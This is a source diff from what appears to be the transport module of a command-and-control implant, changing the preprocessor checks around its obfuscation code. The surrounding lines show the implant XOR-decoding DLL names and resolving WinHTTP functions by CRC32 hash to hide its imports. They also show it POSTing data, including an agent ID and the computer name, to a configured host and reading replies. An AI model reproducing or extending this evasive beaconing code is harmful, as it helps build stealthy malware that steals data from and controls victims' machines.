@@ -52,7 +52,7 @@ BOOL TransportInit( ) {
     // Add session id
     PackageAddInt32( Package, Instance.Session.AgentID );
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     // Get Computer name
     unsigned char s_kernel32[] = S_KERNEL32;
     unsigned char s_advapi32[] = S_ADVAPI32;
@@ -248,7 +248,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     SIZE_T  RespSize        = 0;
     BOOL    Successful      = TRUE;
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     unsigned char s_xk[] = S_XK;
     unsigned char s_string[] = S_WINHTTP;
     char * winhttp = xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk));
@@ -267,7 +267,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         Successful = FALSE;
         goto LEAVE;
     }
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     WinHttpConnect_t pWinHttpConnect  = (WinHttpConnect_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                 WinHttpConnect_CRC32B);
     hConnect = pWinHttpConnect( hSession, Instance.Config.Transport.Host, Instance.Config.Transport.Port, 0 );
@@ -290,7 +290,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     WinHttpOpenRequest_t pWinHttpOpenRequest  = (WinHttpOpenRequest_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                             WinHttpOpenRequest_CRC32B);
     hRequest = pWinHttpOpenRequest( hConnect, L"POST", HttpEndpoint, NULL, NULL, NULL, HttpFlags );
@@ -322,7 +322,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
 
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
     WinHttpSendRequest_t pWinHttpSendRequest  = (WinHttpSendRequest_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                             WinHttpSendRequest_CRC32B);
     // Send our data
@@ -334,7 +334,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     {
 #endif
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
         WinHttpReceiveResponse_t pWinHttpReceiveResponse  = (WinHttpReceiveResponse_t) GetProcAddressByHash(
                 GetModuleHandle(winhttp), WinHttpReceiveResponse_CRC32B);
         if ( RecvData && pWinHttpReceiveResponse( hRequest, NULL ) )
@@ -346,7 +346,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
             RespBuffer = NULL;
             do
             {
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
                 WinHttpReadData_t pWinHttpReadData  = (WinHttpReadData_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                                                WinHttpReadData_CRC32B);
                 Successful = pWinHttpReadData( hRequest, Buffer, 1024, &BufRead );
@@ -401,7 +401,7 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
 
     LEAVE:
 
-#if CONFIG_OBFUSCATION
+#if CONFIG_OBFUSCATION == TRUE
 
     pWinHttpCloseHandle = (WinHttpCloseHandle_t) GetProcAddressByHash(GetModuleHandle(winhttp),
                                                                       WinHttpCloseHandle_CRC32B);
